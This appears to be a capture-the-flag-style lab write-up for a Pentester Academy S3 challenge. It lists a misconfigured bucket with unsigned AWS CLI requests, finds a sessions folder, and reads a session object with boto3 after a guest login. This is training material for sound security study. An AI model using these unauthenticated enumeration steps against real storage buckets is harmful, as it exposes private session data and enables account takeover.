# S3 Python Object Store

Open the lab link and a VNC session will be opened in a new tab with a browser window showing the appication 

![image](https://user-images.githubusercontent.com/46797181/228726011-7eef8812-b4d2-46de-935d-0708fce89a37.png)

Checking the page source, it shows that components are loaded from the s3 bucket 
![image](https://user-images.githubusercontent.com/46797181/228726536-460404e7-c81a-4dd0-a6af-1566d598ced5.png)

Execute the command `aws --endpoint http://s3.pentesteracademylab.appspot.com --no-sign-request s3 ls s3://assets`

#### Note: This challenge is loaded in PT Academy VNC machine, it works only there, using local machine, HTTP 404 will appear 

There is a `sessions` folder, check with `aws --endpoint http://s3.pentesteracademylab.appspot.com --no-sign-request s3 ls s3://assets/sessions/`

The `sessions` directory has a value, log in the web application with the credentials `guest:guest` as stated in the exercise instructions, then repeat the above command and notice that another session object has been created.

![image](https://user-images.githubusercontent.com/46797181/228727892-28109b46-30da-4462-a938-2e5f79a5521e.png)

Interact with the S3 server using boto3 python library and check the content of the recently created object in `sessions` directory.

```

python
import boto3
from botocore import UNSIGNED
from botocore.config import Config
s3=boto3.client('s3',
endpoint_url='http://s3.pentesteracademylab.appspot.com',config=Config(signature_version=UN
SIGNED))
object =
s3.get_object(Bucket='assets',Key='sessions/43085237187070924862845585858148322582')
data=object['Body'].read()
data

```









